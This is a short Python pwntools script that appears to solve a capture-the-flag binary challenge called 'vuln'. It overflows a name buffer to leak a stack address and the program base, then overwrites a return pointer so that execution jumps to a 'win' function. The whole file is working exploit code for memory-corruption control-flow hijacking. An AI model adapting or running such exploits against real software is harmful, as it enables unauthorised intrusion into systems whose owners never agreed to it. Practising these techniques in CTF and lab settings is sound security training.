#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

offset = 0x20

payload  = b"A" * offset

p.sendafter(b"Enter your name:", payload + b"\x50")
p.sendlineafter(b': ', b'1')

p.recvuntil(b'Name: ')
stackAddr = u64(p.recvline().strip().ljust(8, b'\x00')) + 0x118
log.info(f"Leaked stack address: {hex(stackAddr)}")

RIP = stackAddr - 0x20

p.sendlineafter(b': ', b'4')
p.sendlineafter(b"your name again? ", payload + p64(stackAddr))
p.sendlineafter(b': ', b'1')

p.recvuntil(b'Name: ')
elf.address = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x1234
log.info(f"ELF address: {hex(elf.address)}")

p.sendlineafter(b': ', b'4')
p.sendlineafter(b"your name again? ", payload + p64(RIP + 0x10))

p.sendlineafter(b': ', b'3')
p.sendlineafter(b'edit: ', b'1')
p.sendlineafter(b': ', p64(elf.symbols.win))

p.sendlineafter(b': ', b'5')
output = p.recvall()
log.success(f"Output:\n{output.decode()}")